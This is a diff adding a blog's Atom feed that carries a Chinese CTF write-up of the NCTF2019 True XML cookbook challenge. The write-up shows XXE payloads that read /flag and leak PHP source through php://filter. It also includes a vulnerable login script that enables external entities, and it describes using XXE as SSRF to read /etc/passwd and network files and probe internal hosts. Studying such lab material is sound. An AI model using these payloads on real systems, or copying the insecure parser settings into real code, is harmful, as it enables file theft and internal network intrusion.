@@ -1,0 +1,127 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;buuctf，xxe漏洞&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-05-29T13:46:38.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
+    <entry>
+        <id>http://odiws.github.io/2024/05/29/cookbook-1/</id>
+        <title>[nctf2019]truecookbook</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/05/29/cookbook-1/"/>
+        <content type="html">&lt;h2 id=&#34;nctf2019true-xml-cookbook&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nctf2019true-xml-cookbook&#34;&gt;#&lt;/a&gt; [NCTF2019]True XML cookbook&lt;/h2&gt;
+&lt;h3 id=&#34;xxe漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xxe漏洞&#34;&gt;#&lt;/a&gt; xxe 漏洞：&lt;/h3&gt;
+&lt;p&gt;与 Fake XML Cookbook 一样的类型，比 fake 难一些&lt;/p&gt;
+&lt;p&gt;Fake XML Cookbook：&lt;/p&gt;
+&lt;p&gt;这个是直接 xxe 漏洞：&lt;/p&gt;
+&lt;!DOCTYPE note [
+  &lt;!ENTITY admin SYSTEM &#34;file:///flag&#34;&gt;
+&lt;p&gt;]&amp;gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;admin;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;123456&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这个不能这样做：因为没有反应，反正是读文件&lt;/p&gt;
+&lt;p&gt;这个读不了读别的：php:filter/convert.base64-encode/resource=doLogin.php&lt;/p&gt;
+&lt;p&gt;获取源码：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;//doLogin.php
+&amp;lt;?php\n/**
+* autor: c0ny1\n* date: 2018-2-7
+*/
+
+$USERNAME = &#39;admin&#39;; //\xe8\xb4\xa6\xe5\x8f\xb7
+$PASSWORD = &#39;024b87931a03f738fff6693ce0a78c88&#39;; //\xe5\xaf\x86\xe7\xa0\x81
+$result = null;
+libxml_disable_entity_loader(false);   // libxml_disable_entity_loader用于禁用或启用加载外部实体的功能。禁用（TRUE）或启用（FALSE）。
+$xmlfile = file_get_contents(&#39;php://input&#39;);
+try&amp;#123;
+	$dom = new DOMDocument();
+	$dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);   // loadXML() 方法通过解析一个 XML 标签字符串来组成该文档
+	$creds = simplexml_import_dom($dom);
+
+	$username = $creds-&amp;gt;username;
+	$password = $creds-&amp;gt;password;
+
+	if($username == $USERNAME &amp;amp;&amp;amp; $password == $PASSWORD)&amp;#123;
+		$result = sprintf(&amp;quot;&amp;lt;result&amp;gt;&amp;lt;code&amp;gt;%d&amp;lt;/code&amp;gt;&amp;lt;msg&amp;gt;%s&amp;lt;/msg&amp;gt;&amp;lt;/result&amp;gt;&amp;quot;,1,$username);
+	&amp;#125;else&amp;#123;       // sprintf() 函数把格式化的字符串写入变量中。
+		$result = sprintf(&amp;quot;&amp;lt;result&amp;gt;&amp;lt;code&amp;gt;%d&amp;lt;/code&amp;gt;&amp;lt;msg&amp;gt;%s&amp;lt;/msg&amp;gt;&amp;lt;/result&amp;gt;&amp;quot;,0,$username);
+	&amp;#125;	
+&amp;#125;catch(Exception $e)&amp;#123;
+	$result = sprintf(&amp;quot;&amp;lt;result&amp;gt;&amp;lt;code&amp;gt;%d&amp;lt;/code&amp;gt;&amp;lt;msg&amp;gt;%s&amp;lt;/msg&amp;gt;&amp;lt;/result&amp;gt;&amp;quot;,3,$e-&amp;gt;getMessage());
+&amp;#125;
+
+header(&#39;Content-Type: text/html; charset=utf-8&#39;);
+echo $result;
+?&amp;gt;
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;simplexml_import_dom () 函数把 DOM 节点转换为 SimpleXMLElement 对象。获取 DOM 文档节点并转换为 SimpleXML 节点：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+$dom=new domDocument;
+$dom-&amp;gt;loadXML(&amp;quot;&amp;lt;note&amp;gt;&amp;lt;to&amp;gt;Tove&amp;lt;/to&amp;gt;&amp;lt;from&amp;gt;Jani&amp;lt;/from&amp;gt;&amp;lt;/note&amp;gt;&amp;quot;);
+$x=simplexml_import_dom($dom);
+echo $x-&amp;gt;from;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;输出类似：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Jani
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;emm…… 没什么发现，但是读取源码的 payload 我还是在这里记录一哈。&lt;br&gt;
+这一次有所不同，上一题是我们读取文件得到 flag。这次是刺探存活的服务器；&lt;/p&gt;
+&lt;p&gt;其实很多人都小看了 xxe 漏洞，觉得它只可以读读文件啊什么的，其实大错特错，它还可以访问内网的主机，和 ssrf 利用的 dict 伪协议一样，都可以刺探存活的主机并且链接访问；也可以看作这个题是在打内网；&lt;/p&gt;
+&lt;p&gt;好的我们老样子，我们利用 ssrf 读内网文件。先用 file 协议读取相关的文件 /etc/passwd 和 /etc/hosts；当我们读取到 hosts 文件的时候，我们会发现有几个 ip 地址，我们便来访问一下，（到这里应该可以猜到是在打内网了）&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;只能想到利用xxe进行ssrf打内网，扫描一下内网ip的几个文件：/etc/hosts，/proc/net/arp，/proc/net/fib_trie
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/2.png&#34; alt=&#34;2&#34;&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后就是找内网服务器了：读这个 http://173.113.242.10&lt;/p&gt;
+&lt;p&gt;没找到，还在报错&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
+&lt;p&gt;换个服务器&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE3My4xMTMuMjQyLjEx&#34;&gt;http://173.113.242.11&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DTrueXMLcookbook/11.png&#34; alt=&#34;11&#34;&gt;&lt;/p&gt;
+&lt;p&gt;获取 flag，完成啦&lt;/p&gt;
+</content>
+        <category term="buuctf，xxe漏洞" />
+        <updated>2024-05-29T13:46:38.000Z</updated>
+    </entry>
+</feed>
